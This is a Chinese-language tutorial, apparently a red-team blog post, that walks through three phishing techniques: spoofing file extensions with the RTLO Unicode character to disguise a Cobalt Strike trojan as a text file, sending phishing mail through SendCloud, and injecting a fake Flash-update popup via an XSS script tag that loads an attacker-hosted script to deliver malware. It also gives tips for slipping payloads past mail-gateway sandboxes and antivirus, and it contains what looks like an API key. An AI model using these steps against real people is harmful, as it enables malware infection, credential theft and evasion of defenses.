## **使用Unicode欺骗文件扩展名**

“RTLO”字符全名为“RIGHT-TO-LEFTOVERRIDE”，是一个不可显示的控制类字符，其本质是unicode
字符。“RTLO”字符可使电脑将任意语言的文字内容按倒序排列，最初是用来支持一些从右往左写的语言的文字，比如希伯来语。由于它可以重新排列字符的特性，会被不法分子利用从而达到欺骗目标，使得用户运行某些具有危害性的可执行文件。

我们新建一个txt.bat内容为start calc.exe ，点击重命名选择插入Unicode控制字符，选择RLO
此时文件名称会变为bat.txt。![](https://image.3001.net/images/20220126/1643189286_61f114264e76475b398d5.png!small)

双击bat.txt就会打开计算器：

![](https://image.3001.net/images/20220126/1643189330_61f11452bc6953f803f1a.png!small)这里我们进一步利用，使用cs生成powershell木马，将其保存为test.bat。下载安装BAT2EXE，打开该工具，点击open导入前面创建的test.bat，然后将“notepad”添加到test.bat的顶部，点击右侧的icon选择一个txt文本图标。然后将Exe格式更改为“
64位Windows
|（不可见）”，以防止在目标用户打开文件时弹出任何终端，最后点击Convert。![](https://image.3001.net/images/20220126/1643189351_61f11467ba054f3c0413c.png!small)然后单击“保存”。![](https://image.3001.net/images/20220126/1643189371_61f1147beaebf9fed5039.png!small)利用CRL将txt.exe转换为exe.txt。打开记事本，此时会新增一个进程notepad目标用户可以资产操作，当用户关闭此txt时会新增一个powershell进程。这样做会使目标用户相信他们刚刚单击的文件确实是合法的文本文件。![](https://image.3001.net/images/20220126/1643189391_61f1148f772363205b4ee.png!small)此时已成功上线。

![](https://image.3001.net/images/20220126/1643189474_61f114e2c12a634186223.png!small)

##  **邮件钓鱼**

##

在该网址https://www.sendcloud.net注册一个账号，登录成功后，自带一个域名，也可以配置自己的域名，依次点击发送设置---->新增域名，输入自己的域名后点击配置，如下图所示，这里要在自己的域名处按照系统的要求进行解析配置(未配置前是红色X)，域名配置好后，点击检测配置，状态变绿通过检测就可以正常使用了。![](https://image.3001.net/images/20220126/1643189500_61f114fc9f5cf0f6ddc00.png!small)这里是阿里云域名的解析设置：![](https://image.3001.net/images/20220126/1643189524_61f11514eff48e9d4472b.png!small)域名配置好后，点击发送设置---->API_USER，创建一个api_user会生成一个API_KEY，这个key要保存下来，后面发送邮件会用的到。![](https://image.3001.net/images/20220126/1643189541_61f11525933a28253fac7.png!small)e7c0034b0394ecc987daabad4858a694![](https://image.3001.net/images/20220126/1643189555_61f115336eaf1776e76da.png!small)创建完成之后可以在发送相关模块测试邮件发送。![](https://image.3001.net/images/20220126/1643189577_61f115495928a61ebb004.png!small)这边会收到投递回应。![](https://image.3001.net/images/20220126/1643189598_61f1155e39114e0a964a5.png!small)可以使用官方提供的邮件API脚本，官方已经提供各种语言的脚本。

这里使用官方提供的python脚本来进行测试，在脚本中修改相应的内容即可，这里附件木马进行免杀，有的邮件网关的沙箱功能(会把邮件中的附件下载下来运行来反病毒)可能会被拦截，可以将木马文件进行加密压缩，这样沙箱解压不了文件进行检测。然后在钓鱼邮件中告知附件解压：密码（在邮件中不要出现密码这两个字，可能会被邮件网关拦截)。![](https://image.3001.net/images/20220126/1643189622_61f11576a918660b2c2b0.png!small)填好信息后，使用python2运行脚本即可，此时我们可以看到我们的邮箱已经收到了邮件。

![](https://image.3001.net/images/20220126/1643189644_61f1158c699565ed790df.png!small)

##  **flash钓鱼**

我这里使用的是旧版的falsh，项目地址：<https://github.com/r00tSe7en/Flash-Pop>

这里需要在flash.js文件中将下载木马的地址改成自己的，最好注册一个跟flash官网域名相似的域名。![](https://image.3001.net/images/20220126/1643189721_61f115d9070f977f80eef.png!small)使用CS的插件生产一个免杀木马，然后将木马软件替换成flash的图标。这里使用exe，更换图标的方法具体请看此链接：https://blog.csdn.net/qq_37248820/article/details/86495439![](https://image.3001.net/images/20220126/1643189744_61f115f0223ed918f055c.png!small)更换好图标之后将木马上传到服务器上，我们可以在存在xss的地方插入，这里使用script标签构造：

    
    
    payload:<script src="http://www.xx.com/flash/flash.js"></script>

当目标访问此网站时，就会弹框提示flash版本过低请及时升级。![](https://image.3001.net/images/20220126/1643189768_61f1160892f19596b5445.png!small)如果用户点击立即升级下载安装后，CS成功上线。![](https://image.3001.net/images/20220126/1643189806_61f1162ed1043a9afe095.png!small)

